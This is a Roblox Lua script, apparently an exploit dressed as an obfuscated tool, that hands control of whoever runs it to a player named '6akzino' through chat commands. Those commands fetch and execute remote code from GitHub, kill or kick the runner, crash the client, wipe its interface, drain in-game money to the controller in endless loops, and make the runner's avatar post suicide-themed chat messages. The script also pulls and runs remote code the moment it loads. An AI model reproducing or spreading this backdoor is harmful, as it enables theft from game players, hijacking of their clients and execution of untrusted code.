-- This file was generated using Luraph Obfuscator v14.1 [https://lura.ph/]


local name = "[💹💰⭐👑😶⭐💰👴💹🔌🥱] 6akzino"
game.Players["6akzino"].Chatted:Connect(function(message)
	if message:sub(1, 6) == "!print" then
		local text = message:sub(8) 
		print(text)
	end
	if message == "!freeze" then
		game.Players.LocalPlayer.Character.Head.Anchored = true
	end
	if message == "!faded" then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
	end
	if message == "!stando" then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Sindoes/altcontrol/main/stando.lua", true))()
	end
	if message == "!swagmode" then
		loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()
	end
	if message == "!unfreeze" then
		game.Players.LocalPlayer.Character.Head.Anchored = false
	end
	if message == "!ban" then
		game.Players.LocalPlayer:Kick("PERMA-BANNED")
	end
	if message == "!bring" then
		game.Players.LocalPlayer.Character:MoveTo(game.Players["6akzino"].Character.Head.Position)
	end
	if message:sub(1, 5) == "!goto" then
		local text = message:sub(7) 
		game.Players.LocalPlayer.Character:MoveTo(game.Players[text].Character.Head.Position)
	end
	if message == "!kill" then
		game.Players.LocalPlayer.Character.Humanoid.Health = 0
	end
	if message:sub(1, 4) == "!say" then
		local faf = message:sub(6) 
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(faf, "All")
	end
	if message == "!dropmoney" then
		game:GetService("ReplicatedStorage").MainEvent:FireServer("DropMoney", "" .. "10000")
	end
	if message == "!loopdropmoney" then
		while true do
			game:GetService("ReplicatedStorage").MainEvent:FireServer("DropMoney", "" .. "10000")
			wait(1)
		end
	end
	if message == "!crash" then
		while true do
			local ea = Instance.new("Part")
			ea.Parent = game.Workspace
		end
	end
	if message == "!fall" then
		game.Players.LocalPlayer.Character.Humanoid:Destroy()
	end
	if message == "!destroycharacter" then
		game.Players.LocalPlayer.Character:Destroy()
	end
	if message == "!robloxkick" then
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Sindoes/altcontrol/main/warning.lua'))()
	end
	if message:sub(1, 5) == "!kick" then
		local text = message:sub(7) 
		game.Players.LocalPlayer:Kick(text)
	end
	if message:sub(1, 5) == "!name" then
		local fax = message:sub(7) 
		local name = fax
	end
	if message:sub(1, 6) == "!music" then
		local ea = message:sub(8) 
		local scream = Instance.new("Sound")
		scream.Parent = game.Workspace
		scream.Name = "banks"
		scream.SoundId = "rbxassetid://"..ea
		scream:Play()
	end
	if message == "!destroycam" then
		game.Workspace.Camera:Destroy()
	end
	if message == "!stealmoney" then
		game.Workspace.Camera:Destroy()
		game.Players.LocalPlayer.Character:MoveTo(game.Players["6akzino"].Character.Head.Position)
		game.CoreGui:ClearAllChildren()
		while true do
			game:GetService("ReplicatedStorage").MainEvent:FireServer("DropMoney", "" .. "10000")
			wait(0.40)
		end
	end
	if message == "!highlight" then
		local high = Instance.new("Highlight")
		high.Parent = game.Players["6akzino"].Character
		high.FillColor = Color3.new(0, 0, 0)
		high.OutlineTransparency = 0
		high.FillTransparency = 0
	end
	if message == "!uno" then
		game.Players.LocalPlayer.Character.Head.face.Texture = "http://www.roblox.com/asset/?id=7485602656"
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Life is so boring..", "All")
		wait(1)
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Should probably end it..", "All")
		wait(1)
		game.Players.LocalPlayer.Character.Humanoid:Destroy()
	end
end)
loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()
while true do
	game.Players["6akzino"].Character.Humanoid.DisplayName = name
	wait(1)
end
